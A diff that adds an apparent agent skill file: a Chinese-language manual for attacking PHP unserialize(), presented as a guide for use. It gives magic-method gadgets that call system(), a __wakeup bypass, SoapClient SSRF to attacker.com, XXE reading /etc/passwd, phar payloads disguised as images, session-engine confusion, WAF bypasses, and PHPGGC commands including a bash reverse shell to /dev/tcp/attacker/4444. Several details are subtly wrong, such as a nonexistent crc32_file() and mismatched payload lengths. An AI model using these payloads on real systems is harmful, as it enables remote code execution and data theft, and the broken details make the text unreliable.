@@ -1,0 +1,551 @@
+---
+name: php反序列化深度攻击
+description: Use when encountering php反序列化完整利用手册 - 魔术方法链、原生类利用、gc回收、phar、session、pop链构造
+---
+
+# PHP反序列化深度攻击
+
+## Info
+
+- **Domain**: web
+- **Tags**: web, deserialization, php, pop-chain, phar, gadgets
+
+## 一、序列化格式详解
+
+### 基本类型
+```php
+// 标量类型
+b:1;           // boolean true
+i:123;         // integer 123
+d:1.234;       // double 1.234
+s:4:"test";    // string "test" (长度:值)
+N;             // NULL
+
+// 数组
+a:2:{i:0;s:3:"a";i:1;s:3:"b";}  // 索引数组
+a:1:{s:3:"key";s:5:"value";}     // 关联数组
+
+// 对象
+O:4:"Test":2:{s:3:"var";s:5:"value";s:6:"secret";s:6:"hidden";}
+// O:类名长度:类名:属性数:{属性}
+
+// 属性访问修饰符
+s:3:"pub";         // public
+s:6:"\0*\0pro";    // protected (前缀\0*\0)
+s:7:"\0Test\0pri"; // private (前缀\0类名\0)
+```
+
+### 序列化示例
+```php
+class Test {
+    public $pub = 'public';
+    protected $pro = 'protected';
+    private $pri = 'private';
+}
+
+echo serialize(new Test());
+// O:4:"Test":3:{
+//   s:3:"pub";s:6:"public";
+//   s:6:"%00*%00pro";s:9:"protected";
+//   s:9:"%00Test%00pri";s:7:"private";
+// }
+```
+
+## 二、魔术方法全解析
+
+### 触发顺序
+```
+serialize():
+  __sleep() -> 序列化
+
+unserialize():
+  __wakeup() -> 对象创建 -> __construct() (不调用) -> 使用 -> __destruct()
+
+对象销毁:
+  __destruct()
+
+字符串上下文:
+  __toString()
+
+函数调用:
+  __invoke()
+
+属性访问:
+  __get(), __set(), __isset(), __unset()
+
+方法调用:
+  __call(), __callStatic()
+
+克隆:
+  __clone()
+
+其他:
+  __debugInfo(), __set_state(), __serialize(), __unserialize()
+```
+
+### 详细利用
+
+#### __destruct()
+```php
+// 最常用的入口点，对象销毁时触发
+class Exploit {
+    public $cmd;
+    function __destruct() {
+        system($this->cmd);
+    }
+}
+```
+
+#### __wakeup()绕过
+```php
+// CVE-2016-7124 (PHP5 < 5.6.25, PHP7 < 7.0.10)
+// 修改属性数量大于实际值
+
+// 原始
+O:4:"Test":1:{s:3:"cmd";s:2:"id";}
+
+// 绕过
+O:4:"Test":2:{s:3:"cmd";s:2:"id";}
+//             ^ 属性数改为2，跳过__wakeup
+```
+
+#### __toString()
+```php
+// echo/print/字符串拼接时触发
+class ToString {
+    public $file;
+    function __toString() {
+        return file_get_contents($this->file);
+    }
+}
+
+// 触发场景:
+// - echo $obj;
+// - print $obj;
+// - $str = "prefix" . $obj;
+// - preg_match('/pattern/', $obj);  // PHP < 8.0
+// - strcmp($obj, "test");
+// - in_array($obj, $array, true);
+```
+
+#### __call()
+```php
+// 调用不存在的方法时触发
+class Proxy {
+    public $obj;
+    public $method;
+    function __call($name, $args) {
+        return $this->obj->{$this->method}($args);
+    }
+}
+```
+
+#### __get() / __set()
+```php
+// 访问/设置不存在的属性时触发
+class Property {
+    function __get($name) {
+        return $this->{$name};
+    }
+    function __set($name, $value) {
+        $this->{$name} = $value;
+    }
+}
+```
+
+#### __invoke()
+```php
+// 对象作为函数调用时触发
+class Invokable {
+    public $func;
+    function __invoke() {
+        ($this->func)();
+    }
+}
+
+// 触发: $obj();
+```
+
+## 三、PHP原生类利用
+
+### SplFileObject - 文件读取
+```php
+// 读取文件
+$file = new SplFileObject('/etc/passwd');
+foreach($file as $line) echo $line;
+
+// 反序列化利用
+// 注意: SplFileObject构造函数需要参数，不能直接反序列化
+// 但可以通过其他类包装
+```
+
+### DirectoryIterator - 目录遍历
+```php
+// 列目录
+$dir = new DirectoryIterator('/var/www/html');
+foreach($dir as $file) {
+    echo $file->getFilename() . "\n";
+}
+
+// 配合glob://协议
+$dir = new DirectoryIterator('glob://var/www/html/*.php');
+```
+
+### GlobIterator - 通配符匹配
+```php
+new GlobIterator('/var/www/html/*.php');
+new GlobIterator('/flag*');  // 查找flag文件
+```
+
+### SplFixedArray - 数组操作
+```php
+$arr = new SplFixedArray(5);
+$arr[0] = 'test';
+```
+
+### SoapClient - SSRF
+```php
+// SSRF利用
+$client = new SoapClient(null, [
+    'uri' => 'http://attacker.com/',
+    'location' => 'http://attacker.com/ssrf',
+    'user_agent' => "Test\r\nCookie: PHPSESSID=attacker_session"
+]);
+
+// 反序列化利用
+$payload = 'O:10:"SoapClient":5:{
+    s:3:"uri";s:18:"http://attacker.com";
+    s:8:"location";s:23:"http://attacker.com/ssrf";
+    s:11:"user_agent";s:46:"Test\r\nCookie: PHPSESSID=attacker_session\r\n";
+    s:15:"_proxy_host";i:0;
+    s:15:"_proxy_port";i:0;
+}';
+```
+
+### Error/Exception - XSS和信息泄露
+```php
+// Error类在PHP 7+可用
+$error = new Error('<script>alert(1)</script>');
+echo $error;  // 触发XSS
+
+// Exception类
+$ex = new Exception('<script>alert(1)</script>');
+echo $ex;
+```
+
+### SimpleXMLElement - XXE
+```php
+$xml = new SimpleXMLElement('<?xml version="1.0"?>
+  <!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <foo>&xxe;</foo>');
+echo $xml;
+```
+
+### ReflectionClass - 信息泄露
+```php
+// 获取类信息
+$ref = new ReflectionClass('ClassName');
+$ref->getMethods();
+$ref->getProperties();
+```
+
+### 原生类利用表
+
+| 类名 | 利用方式 | PHP版本 |
+|------|----------|---------|
+| SplFileObject | 文件读取 | >= 5.1 |
+| DirectoryIterator | 目录遍历 | >= 5.0 |
+| GlobIterator | 通配符文件查找 | >= 5.3 |
+| FilesystemIterator | 目录遍历 | >= 5.3 |
+| SoapClient | SSRF | >= 5.0 |
+| Error | XSS/信息泄露 | >= 7.0 |
+| Exception | XSS/信息泄露 | >= 5.1 |
+| SimpleXMLElement | XXE | >= 5.0 |
+| DOMDocument | XXE | >= 5.0 |
+| ZipArchive | Zip解压 | >= 5.2 |
+| PharData | Phar操作 | >= 5.3 |
+| PDO | 数据库操作 | >= 5.1 |
+
+## 四、GC回收机制利用
+
+### 原理
+PHP垃圾回收器在处理循环引用时会触发`__destruct()`，可以在反序列化过程中提前触发。
+
+### 触发条件
+```php
+// GC在以下情况触发:
+// 1. 数组元素数超过10000
+// 2. 显式调用gc_collect_cycles()
+
+// 利用: 构造大量对象，触发GC提前回收
+```
+
+### 利用方式
+```php
+// 方法1: 大数组触发GC
+$payload = 'a:10001:{i:0;O:4:"Test":1:{s:3:"cmd";s:2:"id";}';
+
+// 方法2: 循环引用
+$a = new stdClass();
+$a->b = $a;  // 循环引用
+unset($a);   // 触发GC
+
+// 方法3: 反序列化时触发
+class GCExploit {
+    public $a;
+    function __construct() {
+        $this->a = $this;
+    }
+    function __destruct() {
+        system('id');
+    }
+}
+
+// 序列化payload
+// GC会在反序列化过程中触发__destruct
+```
+
+### CTF案例
+```php
+// 题目场景: __wakeup过滤危险字符
+class Challenge {
+    public $cmd;
+    function __wakeup() {
+        $this->cmd = 'safe';  // 重置为安全值
+    }
+    function __destruct() {
+        system($this->cmd);
+    }
+}
+
+// 利用: 通过GC提前触发__destruct，绕过__wakeup
+// 构造: 数组包含大量对象，触发GC
+$payload = 'a:10000:{i:0;O:9:"Challenge":1:{s:3:"cmd";s:2:"id";}';
+// GC会在__wakeup执行前触发__destruct
+```
+
+## 五、引用绕过技巧
+
+### 引用在序列化中的表示
+```php
+$a = array('test');
+$a[1] = &$a[0];
+serialize($a);
+// a:2:{i:0;s:4:"test";i:1;R:2;}
+// R:N 表示引用第N个变量
+```
+
+### 利用引用绕过过滤
+```php
+class Filter {
+    public $filename;
+    function __wakeup() {
+        if (strpos($this->filename, 'flag') !== false) {
+            $this->filename = 'safe.txt';
+        }
+    }
+    function __destruct() {
+        echo file_get_contents($this->filename);
+    }
+}
+
+// 利用引用: 让wakeup修改后，destruct读取的还是原值
+// 需要配合其他类使用
+```
+
+## 六、Phar反序列化深入
+
+### Phar文件结构
+```
+1. Stub: <?php __HALT_COMPILER(); ?>
+2. Manifest: 压缩信息
+3. Contents: 压缩内容
+4. Signature: 签名(可选)
+```
+
+### 生成Phar
+```php
+<?php
+class Exploit {
+    public $cmd = 'id';
+    function __destruct() {
+        system($this->cmd);
+    }
+}
+
+// 生成phar
+$phar = new Phar('exploit.phar');
+$phar->startBuffering();
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->setMetadata(new Exploit());
+$phar->addFromString('test.txt', 'test');
+$phar->stopBuffering();
+
+// 修改后缀绕过检测
+copy('exploit.phar', 'exploit.gif');
+```
+
+### 触发函数大全
+```php
+// 文件系统函数
+file_exists(), is_file(), is_dir(), is_link(), is_readable(), is_writable()
+file_get_contents(), file_put_contents()
+fopen(), fread(), fwrite(), fclose()
+copy(), rename(), unlink()
+stat(), lstat(), fileinode(), fileperms(), filesize(), fileowner(), filegroup()
+filetype(), filemtime(), fileatime(), filectime()
+touch(), link(), symlink()
+
+// 目录函数
+opendir(), readdir(), closedir(), rewinddir()
+
+// 图像函数
+getimagesize(), getimagesizefromstring()
+imagecreatefromgif(), imagecreatefromjpeg(), imagecreatefrompng()
+imagecreatefromwbmp(), imagecreatefromxbm(), imagecreatefromxpm()
+imagegif(), imagejpeg(), imagepng(), imagewbmp(), imagexbm()
+exif_read_data(), exif_thumbnail(), exif_imagetype()
+
+// 哈希函数
+hash_file(), md5_file(), sha1_file(), crc32_file()
+
+// XML/解析函数
+simplexml_load_file()
+xml_parser_create()
+
+// 其他
+include(), include_once(), require(), require_once()
+highlight_file(), show_source()
+parse_ini_file()
+zip_open(), zip_read()
+```
+
+### 协议绕过
+```php
+// 不同协议触发
+phar://exploit.phar/test
+phar://exploit.gif/test  // 伪装后缀
+compress.zlib://phar://exploit.phar/test  // 压缩包装
+compress.bzip2://phar://exploit.phar/test
+php://filter/resource=phar://exploit.phar/test
+```
+
+## 七、Session反序列化
+
+### Session存储引擎
+```php
+// php (默认): |序列化数据
+// php_serialize: 序列化数据
+// php_binary: 键长键名序列化数据
+
+// 不同引擎解析差异可导致漏洞
+```
+
+### Session利用
+```php
+// 配置
+ini_set('session.serialize_handler', 'php_serialize');
+
+// 写入恶意session
+$_SESSION['data'] = '|O:4:"Test":1:{s:3:"cmd";s:2:"id";}';
+
+// 当引擎切换为php时
+// |会被当作分隔符，导致反序列化
+```
+
+### 常见CVE
+```
+CVE-2016-7124: __wakeup绕过
+CVE-2019-11043: PHP-FPM远程代码执行
+```
+
+## 八、POP链构造技巧
+
+### 常见Gadget
+```php
+// ThinkPHP
+class Request {}
+class PendingStream {}
+class AppendIterator {}
+class CachingIterator {}
+
+// Laravel
+class PendingBroadcast {}
+class BusDispatcher {}
+class Pipeline {}
+
+// Symfony
+class Process {}
+class ClassLoader {}
+```
+
+### 构造步骤
+```
+1. 找到入口点: __destruct(), __wakeup(), __toString()
+2. 找跳板: __call(), __get(), __set()
+3. 找终点: system(), eval(), file_put_contents()
+4. 串联成链
+```
+
+### PHPGGC使用
+```bash
+# 列出所有gadget
+./phpggc -l
+
+# Laravel RCE
+./phpggc Laravel/RCE1 "id"
+./phpggc Laravel/RCE2 "cat /flag"
+./phpggc Laravel/RCE3 "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"
+
+# Symfony
+./phpggc Symfony/RCE1 "id"
+./phpggc Symfony/RCE2 "id"
+./phpggc Symfony/RCE3 "id"
+
+# WordPress
+./phpggc WordPress/Subscriber1
+./phpggc WordPress/RCE1 "id"
+
+# ThinkPHP
+./phpggc ThinkPHP/RCE1 "id"
+./phpggc ThinkPHP/RCE2 "id"
+
+# 生成Phar
+./phpggc -p phar Laravel/RCE1 "id" -o exploit.phar
+
+# 编码输出
+./phpggc Laravel/RCE1 "id" -b  # base64
+./phpggc Laravel/RCE1 "id" -u  # url编码
+```
+
+## 九、WAF绕过技巧
+
+### 编码绕过
+```php
+// base64
+$payload = base64_encode(serialize($obj));
+
+// urlencode
+$payload = urlencode(serialize($obj));
+
+// 分块传输
+Transfer-Encoding: chunked
+```
+
+### 字符替换绕过
+```php
+// 过滤O:替换为空
+O:4:"Test" -> OO:4:"Test" (替换后还是O:4:"Test")
+
+// 过滤特定类名
+// 使用命名空间
+\Namespace\Test
+```
+
+### 长度截断
+```php
+// 部分解析器截断长字符串
+$payload = str_repeat('A', 10000) . $evil_payload;
+```
